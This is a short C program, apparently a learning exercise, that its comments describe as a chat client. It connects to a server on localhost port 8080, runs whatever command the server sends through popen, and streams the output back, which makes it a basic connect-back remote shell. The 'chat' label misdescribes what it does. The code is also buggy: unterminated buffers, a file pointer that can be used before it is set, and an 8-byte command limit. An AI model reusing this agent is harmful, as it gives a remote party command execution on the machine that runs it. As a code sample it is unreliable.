#include <stdio.h>
#include <netdb.h>
#include <stdio.h>
#include <strings.h> 
#include <stdlib.h>
#include <string.h>
#include <unistd.h> 
#include <sys/socket.h>
#include <arpa/inet.h>
#define size_buff_client 8
#define PORT 8080
#define SA struct sockaddr
// Function for chating between client and server. 
void chat_func(int my_socket)
{
	int ctr;
	//buffer save the command
	char buffer_client[size_buff_client];
	while(1){
		//file will save all respond 
		FILE* responde_file;
		//clear the buffer
		bzero(buffer_client, sizeof(buffer_client));
		//read the command from socket and save it in buffer
		read(my_socket, buffer_client, sizeof(buffer_client));
		//if buffer contain + client should send the rest respond of last command
		if(buffer_client[0] != '+')
			responde_file = popen(buffer_client, "r");
		bzero(buffer_client, sizeof(buffer_client));
		//break counter limit the chracters will send every time			
		int break_counter = 0;
		int counter = 0;
		
		
		while(1){
			char my_char;
			if(break_counter < 8){
				//reading file chracter by character
				my_char = fgetc(responde_file);
				break_counter++;
			}
			else
				break;
			//checking if client read all the file or not
			if(feof(responde_file)){
				//sending * after sending all respond
				buffer_client[counter] = '*';
				break;
			}
			buffer_client[counter] = my_char;
			counter++;
		}
		//sending respond
		write(my_socket, buffer_client, sizeof(buffer_client));
		
	}
}
int main()
{
	int my_socket, info;
	struct sockaddr_in server_add, client_add;

	//creating socket
	my_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (my_socket == -1) {
		printf("socket creation failed...\n");
		exit(0);
	}
	else
		printf("Socket created...\n");
	bzero(&server_add, sizeof(server_add));

	//IP, PORT
	server_add.sin_family = AF_INET;
	server_add.sin_addr.s_addr = inet_addr("127.0.0.1");
	server_add.sin_port = htons(PORT);

	// connecting client to server
	if (connect(my_socket, (SA*)&server_add, sizeof(server_add))!= 0) {
		printf("connection with the server failed...\n");
		exit(0);
	}
	else
		printf("connected to the server..\n");
	// function for chatting
	chat_func(my_socket);
	//closing socket
	close(my_socket);
}

